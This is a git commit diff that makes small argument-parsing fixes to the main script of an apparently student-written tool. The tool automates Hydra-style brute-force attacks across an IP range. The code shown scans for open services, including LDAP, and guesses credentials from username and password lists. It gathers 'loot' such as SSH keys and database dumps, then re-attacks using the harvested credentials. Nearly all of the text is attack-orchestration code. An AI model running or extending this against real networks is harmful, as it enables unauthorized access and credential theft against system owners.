4901b4b53c2ec8c7716a9cdfa9696a6ffb6d1f1e
Krishna Chittur <kchittur@utexas.edu>
2019-04-28 14:04:17 -0500

    small fixes

--- scripts/main.py
+++ scripts/main.py
@@ -34,16 +34,16 @@ def main():
     import argparse
     parser = argparse.ArgumentParser(description="Automate Hydra attacks against a specified network range.")
     parser.add_argument("-i", "--host_ips", metavar="<i>", type=str,
-                        help="IP address range to search")
+                        help="IP address range to search", dest='host_ips')
     parser.add_argument("-u" "--usernames", metavar="<u>", type=str,
-                        help="File with list of usernames", default=None)
+                        help="File with list of usernames", default=None, dest='usernames')
     parser.add_argument("-p" "--passwords", metavar="<p>", type=str,
-                        help="File with list of passwords", default=None)
-    parser.add_argument("-o" "--outputstream", metavar="<o>", type=str,
-                        help="Optional file to output results to", default=sys.stdout)
+                        help="File with list of passwords", default=None, dest='passwords')
+    parser.add_argument("-o" "--output", metavar="<o>", type=str,
+                        help="Optional file to output results to", default=sys.stdout, dest='output')
     parser.add_argument("-d", "--domain", metavar="<d>", type=str,
                         help="The domain of a potential LDAP server to attack",
-                        default="glauth.com")
+                        default="glauth.com", dest='domain')
     args = parser.parse_args()
 
     # automatically scan the IP address range and log all open ports that we support attacking
@@ -53,24 +53,24 @@ def main():
         # automate a Hydra-esque attack on this host
         for open_service in host_openings[host]:
             exploit = exploits[open_service]
-            exploit.output = args.outputstream
+            exploit.output = args.output
             exploit.domain = args.domain # mainly important for LDAP
             print(f"Attacking host {host} on port {exploit.port} using {exploit.name}. This may take a while.",
-                    file=args.outputstream)
+                    file=args.output)
             # TODO use multiprocessing to do this asynchronously
             # hydra for everyone but ldap
             initial_loot = exploit.attack(host, args.usernames, args.passwords)
             # loot is a list of tuples (username, password). Either field can be None.
             if initial_loot:
-                log_loot(initial_loot, args.outputstream)
+                log_loot(initial_loot, args.output)
                 # get more info from each service (finger, database dumps, ssh keys, etc.)
                 more_loot = exploit.get_loot(initial_loot)
                 if more_loot:
-                    log_loot(more_loot, args.outputstream)
+                    log_loot(more_loot, args.output)
 
     # attack with our new loot
     if not get_logged_loot():
-        print("Attacks completed. No loot gained.", file=args.outputstream)
+        print("Attacks completed. No loot gained.", file=args.output)
         return
     print("Attack completed. Re-attacking services using gathered loot.")
 
@@ -88,7 +88,7 @@ def main():
         os.remove('data/usernames_cache.txt')
         os.remove('data/passwords_cache.txt')
         if new_loot:
-            log_loot(new_loot, args.outputstream)
+            log_loot(new_loot, args.output)
 
 if __name__=='__main__':
     main()
